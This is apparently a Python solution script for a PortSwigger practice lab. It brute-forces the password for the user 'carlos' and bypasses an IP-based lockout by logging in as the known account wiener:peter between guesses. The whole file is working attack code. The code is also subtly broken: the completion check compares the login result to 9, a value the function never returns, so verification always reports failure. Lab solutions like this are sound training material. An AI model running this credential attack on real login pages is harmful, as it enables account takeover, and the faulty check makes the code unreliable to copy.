#!/usr/bin/env python3
# Lab: Broken brute-force protection, IP block
# Lab-Link: https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block
# Difficulty: PRACTITIONER
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def next_credentials():
    for row in open('../candidate_passwords.txt'):
        yield {'username': 'carlos', 'password': row.strip()}
        yield {'username': 'wiener', 'password': 'peter'}


def login(host, username, password, allow_redirects=False):
    '''
    Tries to login with given username and password.
    Possible return values:
        False if no other condition is met
        1 ... status code is 302 and allow_redirects is false (indicating successful login with given credentials)
        2 ... response page contains 'Congratulations' in the page, indicating successful completion of the lab.
              Please note that this will only happen if allow_redirects is set to True
    '''
    data = {'username': username, 'password': password}
    r = requests.post(f'{host}/login', data=data, verify=False, proxies=proxies, allow_redirects=allow_redirects)
    if r.status_code == 302:
        return 1
    res = r.text
    if 'Congratulations' in res:
        return 2
    return False


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f'[ ] Brute force username and password')
    credentials = None
    for credentials in next_credentials():
        result = login(host, credentials['username'], credentials['password'])
        if result == 1 and credentials['username'] != 'wiener':
            break
        credentials = None

    if credentials is not None:
        print(f"[+] Username: {credentials['username']}")
        print(f"[+] Password: {credentials['password']}")
        if login(host, credentials['username'], credentials['password'], allow_redirects=True) == 9:
            print(f"[+] Verified successful lab completion")
        else:
            print(f'[-] Failed to verify credentials, try to login manually')
    else:
        print(f'[-] Failed to obtain valid credentials')


if __name__ == "__main__":
    main()
